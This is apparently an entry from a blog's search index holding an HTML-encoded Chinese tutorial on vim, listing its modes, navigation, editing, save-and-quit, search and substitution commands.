-    <content><![CDATA[<h2 id="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"><a href="#&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;" class="headerlink" title="&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;"></a>&#x4ECB;&#x7ECD;&#xFF1A;vim&#x662F;vi&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x88AB;&#x8A89;&#x4E3A;&#x7EC8;&#x7AEF;&#x7F16;&#x8F91;&#x5668;&#x795E;&#x5668;</h2><h3 id="&#x5B89;&#x88C5;&#xFF1A;"><a href="#&#x5B89;&#x88C5;&#xFF1A;" class="headerlink" title="&#x5B89;&#x88C5;&#xFF1A;"></a>&#x5B89;&#x88C5;&#xFF1A;</h3><p><code>yum install -y vim</code></p>
-<h4 id="&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;"><a href="#&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;" class="headerlink" title="&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;"></a>&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF0C;&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF0C;&#x7F16;&#x8F91;&#x6A21;&#x5F0F;</h4><h4 id="&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;"><a href="#&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;" class="headerlink" title="&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;"></a>&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#xFF1A;&#x4F7F;&#x7528;vim&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x5F0F;</h4><p>vim filename    &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x82E5;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x5C31;&#x65B0;&#x5EFA;&#x6587;&#x4EF6;<br>esc&#xFF1A;&#x5207;&#x6362;&#x5230;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;<br>shift + zz &#xFF1A;&#x4FDD;&#x5B58;&#x9000;&#x51FA;<br>vim filename  +n&#xFF1A; &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;&#x7B2C;n&#x884C;<br>vim filename  +&#xFF1A; &#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;&#x672B;&#x5C3E;<br>gg&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x9996;&#x884C;<br>G&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x5C3E;&#x884C;<br>ngg&#xFF1A;    &#x5B9A;&#x4F4D;&#x5230;&#x7B2C;n&#x884C;<br>^&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x884C;&#x9996;<br>$&#xFF1A;        &#x5B9A;&#x4F4D;&#x5230;&#x884C;&#x5C3E;<br>yy&#xFF1A;        &#x590D;&#x5236;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;<br>p&#xFF1A;        &#x7C98;&#x8D34;<br>nyy&#xFF1A;    &#x590D;&#x5236;&#x5149;&#x6807;&#x5F00;&#x59CB;&#x7684;n&#x884C;<br>dd&#xFF1A;        &#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;<br>ndd&#xFF1A;    &#x5220;&#x9664;&#x5149;&#x6807;&#x5F00;&#x59CB;&#x7684;n&#x884C;<br>u&#xFF1A;        &#x64A4;&#x9500;&#x64CD;&#x4F5C;<br>ctrl + r:    &#x53CD;&#x64A4;&#x9500;&#x64CD;&#x4F5C;</p>
-<h4 id="&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;"><a href="#&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;" class="headerlink" title="&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;"></a>&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;</h4><p>i&#xFF1A;&#x5728;&#x5149;&#x6807;&#x5904;&#x8F93;&#x5165;<br>I&#xFF1A;&#x5728;&#x884C;&#x9996;&#x63D2;&#x5165;<br>a&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5904;&#x63D2;&#x5165;<br>A&#xFF1A;&#x5728;&#x884C;&#x4F4D;&#x63D2;&#x5165;<br>o&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0B;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x4E00;&#x884C;&#x7A7A;&#x884C;<br>O&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0A;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x4E00;&#x884C;&#x7A7A;&#x884C;<br>s&#xFF1A;&#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x5B57;&#x7B26;&#x5E76;&#x63D2;&#x5165;<br>S&#xFF1A;&#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;&#x5E76;&#x63D2;&#x5165;</p>
-<h4 id="&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;"><a href="#&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;" class="headerlink" title="&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;"></a>&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;</h4><p>&#xFF1A;w        &#x4FDD;&#x5B58;<br>&#xFF1A;q        &#x9000;&#x51FA;<br>&#xFF1A;q&#xFF01;    &#x5F3A;&#x5236;&#x9000;&#x51FA;<br>&#xFF1A;wq        &#x4FDD;&#x5B58;&#x9000;&#x51FA;&#xFF0C;&#x7B49;&#x4EF7;&#x4E8E;shift+zz<br>&#xFF1A;x        &#x4FDD;&#x5B58;&#x9000;&#x51FA;&#xFF0C;&#x7B49;&#x4EF7;&#x4E8E;wq<br>&#xFF1A;set nu    &#x663E;&#x793A;&#x884C;&#x53F7;<br>&#xFF1A;set nonu    &#x9690;&#x85CF;&#x884C;&#x53F7;<br>&#xFF1A;&#x884C;&#x53F7;    &#x5B9A;&#x4F4D;&#x5230;&#x6307;&#x5B9A;&#x884C;&#x53F7;<br>/&#x5185;&#x5BB9;        &#x67E5;&#x627E;&#x6307;&#x5B9A;&#x5185;&#x5BB9;&#xFF0C;n&#x4E0B;&#x7FFB;&#xFF0C;N&#x4E0A;&#x7FFB;<br>&#xFF1A;%s/&#x539F;&#x5185;&#x5BB9;/&#x65B0;&#x5185;&#x5BB9;        &#x4F7F;&#x7528;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x539F;&#x5185;&#x5BB9;&#xFF0C;&#x5168;&#x90E8;&#x66FF;&#x6362;<br>&#xFF1A;m,ns/&#x539F;&#x5185;&#x5BB9;/&#x65B0;&#x5185;&#x5BB9;    &#x4F7F;&#x7528;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x539F;&#x5185;&#x5BB9;&#xFF0C;&#x66FF;&#x6362;m&#x884C;&#x5230;n&#x884C;</p>
-<p>&#x53CB;&#x60C5;&#x63D0;&#x793A;&#xFF1A;&#x82E5;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x95ED;vim&#xFF0C;&#x5219;&#x4F1A;&#x751F;&#x6210;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF08;&#x9690;&#x85CF;&#x7684;&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
 ]]></content>
   </entry>
 </search>
